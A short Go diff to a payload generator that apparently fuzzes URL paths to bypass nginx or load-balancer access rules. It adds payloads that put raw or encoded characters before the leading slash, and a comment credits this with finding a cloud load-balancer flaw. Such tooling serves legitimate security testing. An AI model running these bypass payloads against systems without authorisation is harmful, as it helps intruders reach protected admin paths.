@@ -201,7 +201,7 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		}
 	}
 
-	// 3. Insert characters at the beginning of the path
+	// 3. Insert characters at the beginning of the path (after leading slash)
 	// Need to handle root path "/" carefully
 	leadingSlash := "/"
 	pathWithoutLeadingSlash := strings.TrimPrefix(basePath, "/")
@@ -214,6 +214,15 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	}
 	for _, encoded := range encodedBypassChars {
 		addJob(leadingSlash + encoded + pathWithoutLeadingSlash)
+	}
+
+	// 3b. Insert characters BEFORE the leading slash (malformed but may bypass normalization)
+	// Generates patterns like <char>/admin/users (this found the Google Cloud LB vulnerability)
+	for _, char := range rawBypassChars {
+		addJob(char + basePath)
+	}
+	for _, encoded := range encodedBypassChars {
+		addJob(encoded + basePath)
 	}
 
 	// 4a. Insert characters immediately AFTER each path segment (before the next '/')
